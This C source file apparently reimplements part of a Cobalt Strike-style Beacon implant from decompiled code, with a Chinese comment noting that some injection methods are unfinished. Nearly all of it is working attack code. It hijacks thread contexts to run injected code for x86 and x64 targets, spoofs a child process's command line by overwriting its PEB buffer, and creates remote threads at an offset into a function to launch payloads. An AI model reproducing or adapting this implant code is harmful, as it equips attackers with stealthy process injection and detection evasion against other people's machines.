/*
x64兼容完成但是进程注入部分有几个方法暂未实现
*/

#include "BeaconX64.h"
#include "comm.h"
#include "common.h"


#ifdef _WIN64

//x64注入x86
BOOL sub_180012278(HANDLE hThread, DWORD BaseAddress, DWORD64 lpParameter)
{

    if (lpParameter)
    {
        return 0;
    }
    WOW64_CONTEXT Context;
    Context.ContextFlags = 0x100002;
    if (!Wow64GetThreadContext(hThread, &Context))
    {
        return 0;
    }
    Context.Eax = BaseAddress;
    if (!Wow64SetThreadContext(hThread, &Context))
    {
        return 0;
    }
    return ResumeThread(hThread) != -1;
}

//x64注入x64
BOOL sub_1800121EC(HANDLE hThread, DWORD64 BaseAddress, DWORD64 lpParameter)
{

    CONTEXT Context;

    Context.ContextFlags = 0x100002;
    if (!GetThreadContext(hThread, &Context))
    {
        return 0;
    }
    Context.Rcx = BaseAddress;
    Context.Rdx = lpParameter;
    if (!SetThreadContext(hThread, &Context))
    {
        return 0;
    }
    return ResumeThread(hThread) != -1;
}

BOOL sub_1800121D8(BeaconProcessInject* pBeaconProcessInject, DWORD64 BaseAddress, DWORD64 lpParameter)
{
    HANDLE hThread = pBeaconProcessInject->hThread;
    if (pBeaconProcessInject->is_process_arch == 0)
    {
        return sub_180012278(hThread, BaseAddress, lpParameter);
    }
    else
    {
        return sub_1800121EC(hThread, BaseAddress, lpParameter);
    }
}


int sub_10003444(PROCESS_INFORMATION* pInfo, BeaconParameterSpoofing* pBPS)
{
    DWORD flOldProtect;

    if (is_process_arch(pInfo->hProcess))
    {
        BeaconErrorNA(0x40);
        return 0;
    }

    CONTEXT Context;
    DWORD64 addr = 0;
    UNICODE_STRING CommandLine = { 0 };
    Context.ContextFlags = 0x10002;
    if (!GetThreadContext(pInfo->hThread, &Context)
        || !ReadProcessMemory(pInfo->hProcess, (LPCVOID)(Context.Rdx + 32), &addr, 8, 0)
        || !ReadProcessMemory(pInfo->hProcess, (LPCVOID)(addr + 112), &CommandLine, sizeof(UNICODE_STRING), 0)
        || !VirtualProtectEx(pInfo->hProcess, (LPVOID)CommandLine.Buffer, CommandLine.MaximumLength, 4, &flOldProtect))
    {
        BeaconErrorD(0x41, GetLastError());
        return 0;
    }
    char* argc = (char*)malloc(CommandLine.MaximumLength);
    memset(argc, 0, CommandLine.MaximumLength);
    if (!toWideChar(pBPS->cmd, (LPWSTR)argc, CommandLine.MaximumLength))
    {
        BeaconErrorNA(0x42);
        free(argc);
        return 0;
    }
    SIZE_T NumberOfBytesWritten;
    if (!WriteProcessMemory(pInfo->hProcess, (LPVOID)CommandLine.Buffer, argc, CommandLine.MaximumLength, &NumberOfBytesWritten))
    {
        BeaconErrorD(65, GetLastError());
        free(argc);
        return 0;
    }
    return 1;
}

BOOL sub_10004FA1(
    int Remote,
    HANDLE hProcess,
    PVOID BaseAddress,
    LPVOID lpParameter,
    LPCSTR lpModuleName,
    LPCSTR lpProcName,
    int offset)
{
    HANDLE Thread = NULL;
    FARPROC ProcAddress = GetProcAddress(GetModuleHandleA(lpModuleName), lpProcName);
    if (!ProcAddress)
    {
        return 0;
    }

    if (Remote == 6)
    {
        Thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)((char*)ProcAddress + offset), lpParameter, CREATE_SUSPENDED, NULL);
    }
    else
    {
        if (Remote != 7)
        {
            return 0;
        }
        Thread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)((char*)ProcAddress + offset), lpParameter, CREATE_SUSPENDED, 0);
    }

    if (!Thread)
    {
        return 0;
    }
    CONTEXT Context;
    Context.ContextFlags = 0x10000B;
    if (!GetThreadContext(Thread, &Context))
    {
        return 0;
    }
    Context.Rcx = (DWORD64)BaseAddress;


    if (!SetThreadContext(Thread, &Context))
    {
        return 0;
    }
    return ResumeThread(Thread) != -1;
}



#else
BOOL sub_10005463(BeaconProcessInject* pBeaconProcessInject, char* BaseAddress, LPVOID lpParameter)
{

    if (lpParameter)
    {
        return 0;
    }
    if (!pBeaconProcessInject->is_system_process)
    {
        return 0;
    }
    CONTEXT Context;
    Context.ContextFlags = 0x10002;
    if (!GetThreadContext(pBeaconProcessInject->hThread, &Context))
    {
        return 0;
    }
    Context.Eax = (DWORD)BaseAddress;
    return SetThreadContext(pBeaconProcessInject->hThread, &Context)
        && ResumeThread(pBeaconProcessInject->hThread) != -1;
}

int sub_10003444(PROCESS_INFORMATION* pInfo, BeaconParameterSpoofing* pBPS)
{
    DWORD flOldProtect;

    if (is_process_arch(pInfo->hProcess))
    {
        BeaconErrorNA(0x40);
        return 0;
    }

    CONTEXT Context;
    DWORD addr = 0;
    UNICODE_STRING CommandLine = { 0 };
    Context.ContextFlags = 0x10002;
    if (!GetThreadContext(pInfo->hThread, &Context)
        || !ReadProcessMemory(pInfo->hProcess, (LPCVOID)(Context.Ebx + 16), &addr, 4u, 0)
        || !ReadProcessMemory(pInfo->hProcess, (LPCVOID)(addr + 64), &CommandLine, 8, 0)
        || !VirtualProtectEx(pInfo->hProcess, (LPVOID)CommandLine.Buffer, CommandLine.Length, 4, &flOldProtect))
    {
        BeaconErrorD(0x41, GetLastError());
        return 0;
    }
    char* argc = (char*)malloc(CommandLine.Length);
    memset(argc, 0, CommandLine.Length);
    if (!toWideChar(pBPS->cmd, (LPWSTR)argc, CommandLine.Length))
    {
        BeaconErrorNA(0x42);
        free(argc);
        return 0;
    }
    SIZE_T NumberOfBytesWritten;
    if (!WriteProcessMemory(pInfo->hProcess, (LPVOID)CommandLine.Buffer, argc, CommandLine.Length, &NumberOfBytesWritten))
    {
        BeaconErrorD(65, GetLastError());
        free(argc);
        return 0;
    }
    return 1;
}

BOOL sub_10004FA1(
    int Remote,
    HANDLE hProcess,
    PVOID BaseAddress,
    LPVOID lpParameter,
    LPCSTR lpModuleName,
    LPCSTR lpProcName,
    int offset)
{
    HANDLE Thread = NULL;
    FARPROC ProcAddress = GetProcAddress(GetModuleHandleA(lpModuleName), lpProcName);
    if (!ProcAddress)
    {
        return 0;
    }

    if (Remote == 6)
    {
        Thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)((char*)ProcAddress + offset), lpParameter, CREATE_SUSPENDED, NULL);
    }
    else
    {
        if (Remote != 7)
        {
            return 0;
        }
        Thread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)((char*)ProcAddress + offset), lpParameter, CREATE_SUSPENDED, 0);
    }

    if (!Thread)
    {
        return 0;
    }
    CONTEXT Context;
    Context.ContextFlags = 0x10007;
    if (!GetThreadContext(Thread, &Context))
    {
        return 0;
    }
    Context.Eax = (DWORD)BaseAddress;


    if (!SetThreadContext(Thread, &Context))
    {
        return 0;
    }
    return ResumeThread(Thread) != -1;
}


#endif // _WIN64